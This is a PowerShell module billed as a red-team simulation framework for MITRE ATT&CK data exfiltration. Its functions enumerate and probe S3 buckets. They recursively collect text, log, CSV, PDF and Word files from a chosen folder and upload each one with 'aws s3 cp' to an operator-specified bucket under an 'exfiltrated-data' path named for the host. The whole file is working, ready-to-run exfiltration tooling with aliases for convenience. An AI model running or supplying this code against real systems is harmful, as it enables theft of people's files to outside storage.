# Exfiltration.psm1
# Data Exfiltration PowerShell Module - MITRE ATT&CK T1041, T1567.002
# Security Research and Red Team Simulation Framework

function Ensure-OutputDirectory {
    param([string]$Path)
    if (!(Test-Path $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
    }
}

function Invoke-S3Discovery {
    <#
    .SYNOPSIS
        Discovers accessible S3 buckets using AWS CLI or PowerShell methods
    .PARAMETER Region
        AWS region to search (default: us-east-1)
    .PARAMETER OutputPath
        Path to save discovery results
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Region = "us-east-1",

        [Parameter(Mandatory=$false)]
        [string]$OutputPath = "C:\Intel\Logs",

        [Parameter(Mandatory=$false)]
        [string]$Profile = "default"
    )

    Write-Host "[*] Starting S3 Bucket Discovery..." -ForegroundColor Cyan
    Write-Host "[*] Target Region: $Region" -ForegroundColor Gray

    Ensure-OutputDirectory -Path $OutputPath

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = Join-Path $OutputPath "Exfiltration_S3Discovery_$timestamp.txt"

    $results = @()
    $results += "=" * 60
    $results += "S3 BUCKET DISCOVERY - $(Get-Date)"
    $results += "=" * 60
    $results += ""
    $results += "Target Region: $Region"
    $results += "AWS Profile: $Profile"
    $results += ""

    # Method 1: Try AWS CLI if available
    Write-Host "[*] Checking AWS CLI availability..." -ForegroundColor Gray
    try {
        $awsVersion = aws --version 2>$null
        if ($awsVersion) {
            Write-Host "[+] AWS CLI detected: $awsVersion" -ForegroundColor Green
            $results += "[+] AWS CLI Available: $awsVersion"

            # List S3 buckets
            Write-Host "[*] Listing accessible S3 buckets..." -ForegroundColor Gray
            try {
                $buckets = aws s3 ls --profile $Profile 2>$null
                if ($buckets) {
                    $results += ""
                    $results += "[+] Accessible S3 Buckets:"
                    $results += $buckets
                    Write-Host "[+] Found accessible buckets" -ForegroundColor Green
                } else {
                    $results += ""
                    $results += "[-] No accessible buckets found or authentication failed"
                    Write-Host "[-] No accessible buckets found" -ForegroundColor Yellow
                }
            } catch {
                $results += "[-] Error listing buckets: $($_.Exception.Message)"
                Write-Host "[-] Error listing buckets: $($_.Exception.Message)" -ForegroundColor Red
            }

            # Test bucket permissions
            Write-Host "[*] Testing common bucket names..." -ForegroundColor Gray
            $commonBuckets = @(
                "backup", "backups", "data", "logs", "archive", "storage", "files",
                "public", "private", "temp", "tmp", "upload", "uploads", "documents",
                "company-backup", "org-data", "internal", "shared"
            )

            $results += ""
            $results += "[*] Testing Common Bucket Names:"

            foreach ($bucketName in $commonBuckets) {
                try {
                    $testResult = aws s3 ls "s3://$bucketName" --profile $Profile 2>$null
                    if ($testResult) {
                        $results += "[+] Accessible: $bucketName"
                        Write-Host "[+] Found accessible bucket: $bucketName" -ForegroundColor Green
                    }
                } catch {
                    # Bucket doesn't exist or no access - normal
                }
            }

        } else {
            throw "AWS CLI not available"
        }
    } catch {
        Write-Host "[-] AWS CLI not available, trying alternative methods..." -ForegroundColor Yellow
        $results += "[-] AWS CLI not available"

        # Method 2: Try PowerShell AWS module
        try {
            if (Get-Module -ListAvailable -Name "AWSPowerShell*") {
                Write-Host "[*] AWS PowerShell module detected" -ForegroundColor Green
                Import-Module AWSPowerShell -ErrorAction SilentlyContinue

                # This would require AWS credentials to be configured
                $results += "[+] AWS PowerShell module available"
                $results += "[!] Manual AWS credential configuration required"

            } else {
                $results += "[-] AWS PowerShell module not available"
                Write-Host "[-] AWS PowerShell module not available" -ForegroundColor Yellow
            }
        } catch {
            $results += "[-] Error with AWS PowerShell module: $($_.Exception.Message)"
        }

        # Method 3: Manual S3 endpoint testing (basic HTTP)
        Write-Host "[*] Attempting basic S3 endpoint connectivity..." -ForegroundColor Gray
        $results += ""
        $results += "[*] Basic S3 Endpoint Testing:"

        $s3Endpoints = @(
            "s3.amazonaws.com",
            "$Region.amazonaws.com",
            "s3-$Region.amazonaws.com"
        )

        foreach ($endpoint in $s3Endpoints) {
            try {
                $response = Test-NetConnection -ComputerName $endpoint -Port 443 -InformationLevel Quiet
                if ($response) {
                    $results += "[+] S3 endpoint reachable: $endpoint"
                    Write-Host "[+] S3 endpoint reachable: $endpoint" -ForegroundColor Green
                } else {
                    $results += "[-] S3 endpoint unreachable: $endpoint"
                }
            } catch {
                $results += "[-] Error testing endpoint $endpoint : $($_.Exception.Message)"
            }
        }
    }

    # Save results
    $results += ""
    $results += "=" * 60
    $results += "Discovery completed: $(Get-Date)"
    $results += "Results saved to: $outputFile"
    $results += "=" * 60

    $results | Out-File -FilePath $outputFile -Encoding UTF8

    Write-Host "[+] S3 Discovery complete. Results saved to: $outputFile" -ForegroundColor Green
    return $outputFile
}

function Invoke-DataExfiltration {
    <#
    .SYNOPSIS
        Exfiltrates collected data to specified S3 bucket
    .PARAMETER BucketName
        Target S3 bucket name
    .PARAMETER Region
        AWS region of the bucket
    .PARAMETER DataPath
        Path containing data to exfiltrate
    .PARAMETER Profile
        AWS profile to use
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$BucketName,

        [Parameter(Mandatory=$false)]
        [string]$Region = "us-east-1",

        [Parameter(Mandatory=$false)]
        [string]$DataPath = "C:\Intel\Logs",

        [Parameter(Mandatory=$false)]
        [string]$Profile = "default",

        [Parameter(Mandatory=$false)]
        [string]$OutputPath = "C:\Intel\Logs"
    )

    Write-Host "[*] Starting Data Exfiltration..." -ForegroundColor Red
    Write-Host "[*] Target Bucket: $BucketName" -ForegroundColor Gray
    Write-Host "[*] Data Source: $DataPath" -ForegroundColor Gray

    Ensure-OutputDirectory -Path $OutputPath

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $logFile = Join-Path $OutputPath "Exfiltration_Upload_$timestamp.txt"

    $results = @()
    $results += "=" * 60
    $results += "DATA EXFILTRATION LOG - $(Get-Date)"
    $results += "=" * 60
    $results += ""
    $results += "Target Bucket: $BucketName"
    $results += "Source Path: $DataPath"
    $results += "AWS Region: $Region"
    $results += "AWS Profile: $Profile"
    $results += ""

    # Verify AWS CLI
    try {
        $awsVersion = aws --version 2>$null
        if (!$awsVersion) {
            throw "AWS CLI not available"
        }

        Write-Host "[+] AWS CLI available: $awsVersion" -ForegroundColor Green
        $results += "[+] AWS CLI: $awsVersion"

        # Test bucket access
        Write-Host "[*] Testing bucket access..." -ForegroundColor Gray
        try {
            $bucketTest = aws s3 ls "s3://$BucketName" --profile $Profile 2>$null
            $results += "[+] Bucket access verified: $BucketName"
            Write-Host "[+] Bucket access verified" -ForegroundColor Green
        } catch {
            $results += "[-] Bucket access failed: $($_.Exception.Message)"
            Write-Host "[-] Bucket access failed" -ForegroundColor Red
            throw "Cannot access target bucket"
        }

        # Gather files to exfiltrate
        Write-Host "[*] Gathering files for exfiltration..." -ForegroundColor Gray
        if (!(Test-Path $DataPath)) {
            throw "Data path not found: $DataPath"
        }

        $files = Get-ChildItem -Path $DataPath -File -Recurse | Where-Object {
            $_.Extension -in @('.txt', '.log', '.json', '.xml', '.csv', '.pdf', '.doc', '.docx')
        }

        if ($files.Count -eq 0) {
            Write-Host "[-] No files found for exfiltration" -ForegroundColor Yellow
            $results += "[-] No compatible files found in $DataPath"
        } else {
            Write-Host "[+] Found $($files.Count) files for exfiltration" -ForegroundColor Green
            $results += "[+] Files to exfiltrate: $($files.Count)"
            $results += ""

            $uploadedCount = 0
            $failedCount = 0

            foreach ($file in $files) {
                $relativePath = $file.FullName.Substring($DataPath.Length).TrimStart('\', '/')
                $s3Key = "exfiltrated-data/$env:COMPUTERNAME/$timestamp/$relativePath"

                Write-Host "[*] Uploading: $($file.Name)" -ForegroundColor Gray
                $results += "[*] Uploading: $relativePath"

                try {
                    $uploadResult = aws s3 cp $file.FullName "s3://$BucketName/$s3Key" --profile $Profile 2>&1

                    if ($LASTEXITCODE -eq 0) {
                        Write-Host "[+] Uploaded: $($file.Name)" -ForegroundColor Green
                        $results += "[+] Success: s3://$BucketName/$s3Key"
                        $uploadedCount++
                    } else {
                        Write-Host "[-] Failed: $($file.Name)" -ForegroundColor Red
                        $results += "[-] Failed: $uploadResult"
                        $failedCount++
                    }
                } catch {
                    Write-Host "[-] Error uploading $($file.Name): $($_.Exception.Message)" -ForegroundColor Red
                    $results += "[-] Error: $($_.Exception.Message)"
                    $failedCount++
                }
            }

            $results += ""
            $results += "[+] Upload Summary:"
            $results += "    Successful: $uploadedCount"
            $results += "    Failed: $failedCount"
            $results += "    Total: $($files.Count)"

            Write-Host "[+] Exfiltration complete: $uploadedCount uploaded, $failedCount failed" -ForegroundColor Green
        }

    } catch {
        $results += "[-] Exfiltration failed: $($_.Exception.Message)"
        Write-Host "[-] Exfiltration failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Save results
    $results += ""
    $results += "=" * 60
    $results += "Exfiltration completed: $(Get-Date)"
    $results += "Log saved to: $logFile"
    $results += "=" * 60

    $results | Out-File -FilePath $logFile -Encoding UTF8

    Write-Host "[+] Exfiltration log saved to: $logFile" -ForegroundColor Green
    return $logFile
}

function Invoke-FullExfiltration {
    <#
    .SYNOPSIS
        Performs complete exfiltration workflow: discovery + data upload
    .PARAMETER TargetBucket
        Target S3 bucket name
    .PARAMETER Region
        AWS region
    .PARAMETER DataPath
        Path containing data to exfiltrate
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetBucket,

        [Parameter(Mandatory=$false)]
        [string]$Region = "us-east-1",

        [Parameter(Mandatory=$false)]
        [string]$DataPath = "C:\Intel\Logs",

        [Parameter(Mandatory=$false)]
        [string]$Profile = "default"
    )

    Write-Host "========================================" -ForegroundColor Red
    Write-Host " FULL DATA EXFILTRATION WORKFLOW" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""

    # Step 1: S3 Discovery
    Write-Host "[STEP 1] S3 Bucket Discovery" -ForegroundColor Cyan
    try {
        $discoveryResult = Invoke-S3Discovery -Region $Region -OutputPath $DataPath -Profile $Profile
        Write-Host "[+] Discovery completed: $discoveryResult" -ForegroundColor Green
    } catch {
        Write-Host "[-] Discovery failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host ""

    # Step 2: Data Exfiltration
    Write-Host "[STEP 2] Data Exfiltration" -ForegroundColor Cyan
    try {
        $exfiltrationResult = Invoke-DataExfiltration -BucketName $TargetBucket -Region $Region -DataPath $DataPath -Profile $Profile
        Write-Host "[+] Exfiltration completed: $exfiltrationResult" -ForegroundColor Green
    } catch {
        Write-Host "[-] Exfiltration failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host ""
    Write-Host "[+] Full exfiltration workflow complete!" -ForegroundColor Green
}

function Get-ExfiltrationResults {
    <#
    .SYNOPSIS
        Displays summary of recent exfiltration activities
    .PARAMETER Path
        Path to search for exfiltration logs
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Path = "C:\Intel\Logs"
    )

    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host " EXFILTRATION RESULTS SUMMARY" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan

    if (!(Test-Path $Path)) {
        Write-Host "[-] Results path not found: $Path" -ForegroundColor Red
        return
    }

    # Find exfiltration log files
    $logFiles = Get-ChildItem -Path $Path -Filter "Exfiltration_*.txt" | Sort-Object LastWriteTime -Descending

    if ($logFiles.Count -eq 0) {
        Write-Host "[-] No exfiltration logs found in $Path" -ForegroundColor Yellow
        return
    }

    Write-Host "[+] Found $($logFiles.Count) exfiltration log files:" -ForegroundColor Green
    Write-Host ""

    foreach ($log in $logFiles) {
        Write-Host "File: $($log.Name)" -ForegroundColor White
        Write-Host "Date: $($log.LastWriteTime)" -ForegroundColor Gray
        Write-Host "Size: $([math]::Round($log.Length/1KB, 2)) KB" -ForegroundColor Gray

        # Show first few lines of each log
        $content = Get-Content $log.FullName -First 10
        $content | ForEach-Object { Write-Host "  $_" -ForegroundColor DarkGray }
        Write-Host ""
    }

    Write-Host "[+] Use 'Get-Content <logfile>' to view complete results" -ForegroundColor Green
}

# Export functions and aliases
Export-ModuleMember -Function @(
    'Invoke-S3Discovery',
    'Invoke-DataExfiltration',
    'Invoke-FullExfiltration',
    'Get-ExfiltrationResults'
)

# Create aliases for easier usage
New-Alias -Name 'Find-S3Buckets' -Value 'Invoke-S3Discovery'
New-Alias -Name 'Start-Exfiltration' -Value 'Invoke-DataExfiltration'
New-Alias -Name 'Run-Exfiltration' -Value 'Invoke-FullExfiltration'
New-Alias -Name 'Get-ExfilResults' -Value 'Get-ExfiltrationResults'

Export-ModuleMember -Alias @(
    'Find-S3Buckets',
    'Start-Exfiltration',
    'Run-Exfiltration',
    'Get-ExfilResults'
)